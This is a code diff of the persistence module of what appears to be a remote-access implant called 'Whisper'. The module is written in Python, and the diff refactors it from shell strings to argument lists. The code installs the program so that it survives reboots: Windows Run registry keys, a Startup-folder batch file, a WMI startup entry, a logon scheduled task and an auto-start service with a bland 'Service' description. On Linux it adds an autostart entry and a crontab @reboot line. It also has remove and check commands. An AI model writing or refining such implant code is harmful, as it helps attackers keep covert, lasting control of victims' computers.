@@ -10,65 +10,65 @@ def _cmd_persist(m):
             name = m.get("name", "Whisper")
 
             if action == "install":
-                # Registry Run keys
                 for hive, key in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                                   (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
                     try:
                         with winreg.OpenKey(hive, key, 0, winreg.KEY_SET_VALUE) as k:
                             winreg.SetValueEx(k, name, 0, winreg.REG_SZ, sp)
                         r.append("HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "HKCU")
-                    except: pass
-                # Startup Folder
+                    except:
+                        pass
                 sf = os.path.join(os.environ.get("APPDATA",""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                 try:
                     os.makedirs(sf, exist_ok=True)
                     with open(os.path.join(sf, f"{name}.bat"), "w") as f:
                         f.write(f'@start "" "{sp}"')
                     r.append("Startup")
-                except: pass
-                # WMI
+                except:
+                    pass
                 try:
-                    subprocess.run(f'wmic startup call create "{sp}", "{name}"', shell=True, capture_output=True, timeout=10)
+                    subprocess.run(["wmic", "startup", "call", "create", sp, name], capture_output=True, timeout=10)
                     r.append("WMI")
-                except: pass
-                # Scheduled Task (run on logon)
+                except:
+                    pass
                 try:
-                    subprocess.run(f'schtasks /create /tn "{name}" /tr "{sp}" /sc onlogon /ru "%%USERNAME%%" /f', shell=True, capture_output=True, timeout=15)
+                    subprocess.run(["schtasks", "/create", "/tn", name, "/tr", sp, "/sc", "onlogon", "/ru", "%%USERNAME%%", "/f"], capture_output=True, timeout=15)
                     r.append("SchedTask")
-                except: pass
-                # Windows Service (via sc)
+                except:
+                    pass
                 try:
                     svc_name = f"{name}Svc"
-                    subprocess.run(f'sc create "{svc_name}" binPath= "{sp}" start= auto', shell=True, capture_output=True, timeout=10)
-                    subprocess.run(f'sc description "{svc_name}" "Service"', shell=True, capture_output=True, timeout=10)
+                    subprocess.run(["sc", "create", svc_name, "binPath=", sp, "start=", "auto"], capture_output=True, timeout=10)
+                    subprocess.run(["sc", "description", svc_name, "Service"], capture_output=True, timeout=10)
                     r.append("Service")
-                except: pass
+                except:
+                    pass
                 return {"output": f"[+] Persistence: {', '.join(r) if r else 'failed'}"}
 
-            else:  # remove
-                # Registry
+            else:
                 for hive, key in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                                   (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
                     try:
                         with winreg.OpenKey(hive, key, 0, winreg.KEY_SET_VALUE) as k:
                             winreg.DeleteValue(k, name)
                         r.append(f"Removed HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "Removed HKCU")
-                    except: pass
-                # Startup
+                    except:
+                        pass
                 try:
                     os.remove(os.path.join(os.environ.get("APPDATA",""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", f"{name}.bat"))
                     r.append("Removed Startup")
-                except: pass
-                # Scheduled Task
+                except:
+                    pass
                 try:
-                    subprocess.run(f'schtasks /delete /tn "{name}" /f', shell=True, capture_output=True, timeout=10)
+                    subprocess.run(["schtasks", "/delete", "/tn", name, "/f"], capture_output=True, timeout=10)
                     r.append("Removed SchedTask")
-                except: pass
-                # Service
+                except:
+                    pass
                 try:
-                    subprocess.run(f'sc delete "{name}Svc"', shell=True, capture_output=True, timeout=10)
+                    subprocess.run(["sc", "delete", f"{name}Svc"], capture_output=True, timeout=10)
                     r.append("Removed Service")
-                except: pass
+                except:
+                    pass
                 return {"output": f"[+] Persistence removed: {', '.join(r) if r else 'nothing found'}"}
 
         elif platform.system() == "Linux":
@@ -82,21 +82,26 @@ def _cmd_persist(m):
                         f.write(f"[Desktop Entry]\nType=Application\nName=Whisper\nExec=python3 {sp}\n")
                     r.append("autostart")
                 try:
-                    subprocess.run(f'(crontab -l 2>/dev/null; echo "@reboot python3 {sp}") | crontab -', shell=True, timeout=10)
+                    crontab_in = subprocess.check_output(["crontab", "-l"], timeout=5, stderr=subprocess.DEVNULL).decode()
+                    new_entry = f"@reboot python3 {sp}\n{crontab_in}"
+                    subprocess.run(["crontab", "-"], input=new_entry.encode(), timeout=5)
                     r.append("crontab")
-                except: pass
+                except:
+                    pass
             else:
                 for d in [os.path.join(h,".config","autostart")]:
                     try:
                         os.remove(os.path.join(d,"whisper.desktop"))
                         r.append("Removed autostart")
-                    except: pass
+                    except:
+                        pass
                 try:
                     out = subprocess.check_output(["crontab","-l"], timeout=5).decode()
                     new = "\n".join(l for l in out.split("\n") if sp not in l)
-                    subprocess.run(f"crontab -", input=new, shell=True, timeout=5)
+                    subprocess.run(["crontab", "-"], input=new.encode(), timeout=5)
                     r.append("Removed crontab")
-                except: pass
+                except:
+                    pass
             return {"output": f"[+] Persistence: {', '.join(r)}"}
 
         elif platform.system() == "Darwin":
@@ -126,12 +131,13 @@ def _cmd_persist_check(m):
                     with winreg.OpenKey(hive, key, 0, winreg.KEY_READ) as k:
                         val, _ = winreg.QueryValueEx(k, "Whisper")
                         r.append(f"Registry ({'HKLM' if hive == winreg.HKEY_LOCAL_MACHINE else 'HKCU'}): {val}")
-                except: pass
-            import subprocess
+                except:
+                    pass
             try:
-                out = subprocess.check_output(f'schtasks /query /tn "Whisper" /fo LIST', shell=True, timeout=10, creationflags=0x08000000, stderr=subprocess.DEVNULL).decode(errors="replace")
+                out = subprocess.check_output(["schtasks", "/query", "/tn", "Whisper", "/fo", "LIST"], timeout=10, stderr=subprocess.DEVNULL).decode(errors="replace")
                 r.append("Scheduled Task: " + out.split("\n")[0][:80])
-            except: pass
+            except:
+                pass
             return {"output": "\n".join(r) if r else "[!] No persistence found"}
         return {"output": "[!] Check not supported on this OS"}
     except Exception as e: return {"output": f"[!] Persist check error: {e}"}
